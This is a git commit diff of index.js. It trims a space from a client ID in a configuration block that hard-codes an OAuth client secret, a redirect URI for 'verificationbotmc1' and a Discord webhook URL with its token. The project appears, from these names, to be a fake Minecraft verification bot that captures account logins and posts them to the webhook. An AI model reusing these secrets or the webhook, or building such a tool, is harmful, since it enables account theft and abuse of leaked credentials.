3db3b98b675991a2691aac633b0fc6adc39b0766
sushisonline <118045539+sushisonline@users.noreply.github.com>
2022-11-12 00:51:48 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 // Configuration
 const client_secret = 'tKW8Q~~f.djPOv84ogaNt-t615IOuAxlA4NWbcty'
-const client_id = '6cfdbec3-62e8-4e6b-af4e-894eea7b914f '
+const client_id = '6cfdbec3-62e8-4e6b-af4e-894eea7b914f'
 const redirect_uri = 'https://verificationbotmc1.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040909509272547348/2mhbJGEiFjmj98UA_Vhw1GmTcFA1rFKLwpFcNKfhDu7Amp4k2SQ9-0XwBUPsi0HnJtQf'
 const webhook_logging_url = 'change'
